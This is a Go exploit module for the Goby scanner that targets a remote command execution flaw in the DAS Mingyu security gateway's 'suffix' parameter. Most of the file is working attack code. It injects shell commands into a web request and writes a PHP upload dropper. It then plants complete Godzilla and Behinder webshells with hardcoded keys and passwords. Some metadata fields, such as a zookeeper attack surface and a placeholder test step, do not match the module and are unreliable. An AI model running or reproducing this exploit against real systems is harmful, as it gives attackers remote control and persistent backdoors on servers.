package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Developed by DAS-Security Technology Co., LTD., DAS-Security Mingyu Security Gateway aims to provide comprehensive network security protection, help enterprises and organizations establish a solid network defense system, and protect critical information assets and businesses from various cyber threats.</p><p>The remote command execution vulnerability of the security gateway allows an attacker to arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "DAS_Security-Mingyu-SecGW",
    "Homepage": "https://www.dbappsecurity.com.cn/",
    "DisclosureDate": "2023-08-08",
    "Author": "Sanyuee1@163.com",
    "FofaQuery": "title=\"明御安全网关\" || body=\"/webui/images/basic/login/login_logo.png\" || body=\"/webui/images/default/default/alert_close.jpg\" || header=\"USGSESSID\" || banner=\"USGSESSID\"",
    "GobyQuery": "title=\"明御安全网关\" || body=\"/webui/images/basic/login/login_logo.png\" || body=\"/webui/images/default/default/alert_close.jpg\" || header=\"USGSESSID\" || banner=\"USGSESSID\"",
    "Level": "3",
    "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Filter the suffix parameter.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "1q2w3e.txt",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "1q2w3e4r",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        {
            "NetTest": {
                "Timeout": 20,
                "Packets": [
                    {
                        "Request": {
                            "SendData": "envi"
                        },
                        "ResponseTest": {
                            "Type": "item",
                            "RecvSize": 1024,
                            "Variable": "$buf",
                            "Operation": "contains",
                            "Value": "Environment"
                        }
                    }
                ]
            }
        }
    ],
    "Posttime": "2018-10-22 21:44:46",
    "Tags": [
        "Command Execution",
        "File Upload"
    ],
    "AttackSurfaces": {
        "Service": [
            "zookeeper"
        ]
    },
    "fofacli_version": "3.0.8",
    "fofascan_version": "0.1.16",
    "status": "0",
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "VulType": [
        "Command Execution",
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "安恒明御安全网关 suffix 参数远程命令执行漏洞",
            "Product": "安恒信息-明御安全网关",
            "Description": "<p>安恒明御安全网关由安恒信息技术股份有限公司开发，明御安全网关旨在提供全面的网络安全保护，帮助企业和组织建立稳固的网络防御体系，保护关键信息资产和业务免受各种网络威胁的侵害。</p><p>安恒明御安全网关存在远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>1、对 suffix 参数的传入进行过滤。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行",
                "文件上传"
            ],
            "Tags": [
                "命令执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "DAS Mingyu security gateway suffix parameter remote command execution vulnerability",
            "Product": "DAS_Security-Mingyu-SecGW",
            "Description": "<p>Developed by DAS-Security Technology Co., LTD., DAS-Security Mingyu Security Gateway aims to provide comprehensive network security protection, help enterprises and organizations establish a solid network defense system, and protect critical information assets and businesses from various cyber threats.</p><p>The remote command execution vulnerability of the security gateway allows an attacker to arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Filter the suffix parameter.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution",
                "File Upload"
            ],
            "Tags": [
                "Command Execution",
                "File Upload"
            ]
        }
    },
    "Name": "DAS Mingyu security gateway suffix parameter remote command execution vulnerability",
    "CVSSScore": "9.8",
    "Is0day": false,
    "PocId": "10887"
}`

	base64EncodeJDI1512sd := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}

	sendPayloadNISBF2151Adsd := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uri := "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|" + url.QueryEscape(payload) + ""
		sendPayloadRequestConfig := httpclient.NewGetRequestConfig(uri)
		sendPayloadRequestConfig.FollowRedirect = false
		sendPayloadRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, sendPayloadRequestConfig)
	}
	verificationStateHFSKNI411840 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		checkFileRequestConfig := httpclient.NewGetRequestConfig("/webui/" + filename)
		checkFileRequestConfig.FollowRedirect = false
		checkFileRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, checkFileRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(15)
			payload := `rm -rf aaaaaa.txt && echo ` + strconv.Quote(checkStr) + ` > aaaaaa.txt`
			if resp, err := sendPayloadNISBF2151Adsd(hostInfo, payload); err != nil || resp == nil {
				return false
			} else if resp.StatusCode != 200 {
				return false
			} else {
				resp, _ = verificationStateHFSKNI411840(hostInfo, `aaaaaa.txt`)
				return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var filename, content string
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "cmd" {
				payload := `rm -rf aaaaaa.txt && ` + cmd + ` > aaaaaa.txt  2>&1`
				if resp, err := sendPayloadNISBF2151Adsd(expResult.HostInfo, payload); err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					if resp, err = verificationStateHFSKNI411840(expResult.HostInfo, `aaaaaa.txt`); resp != nil && resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp.Utf8Html
					}
				}
			} else if attackType == "webshell" {
				filename = ".up.php"
				sendUpload := "echo+\"<?php+\\$filename=\\$_POST['filename'];\\$content=base64_decode(\\$_POST['content']);file_put_contents(\\$filename,+\\$content);?>\"+>+" + filename + ""
				if resp, err := sendPayloadNISBF2151Adsd(expResult.HostInfo, sendUpload); err == nil && resp.StatusCode == 200 {
					_, err := verificationStateHFSKNI411840(expResult.HostInfo, filename)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
				}
				if webshell == "godzilla" {
					filename = goutils.RandomHexString(6) + ".php"
					content = "<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}"
				} else if webshell == "behinder" {
					filename = goutils.RandomHexString(6) + ".php"
					content = "<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);?>"
				} else if webshell == "custom" {
					content = goutils.B2S(ss.Params["content"])
					filename = goutils.B2S(ss.Params["filename"])
				}
				uri := "/webui/.up.php"
				postConfig := httpclient.NewPostRequestConfig(uri)
				postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				postConfig.VerifyTls = false
				postConfig.FollowRedirect = false
				postConfig.Data = fmt.Sprintf("filename=" + filename + "&content=" + base64EncodeJDI1512sd(content) + "")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, postConfig); err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Success = true
					expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/webui/"+filename)
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
						expResult.Output += "Webshell type: PHP"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
					}
					if webshell != "custom" {
						expResult.Output += "Webshell type: PHP"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
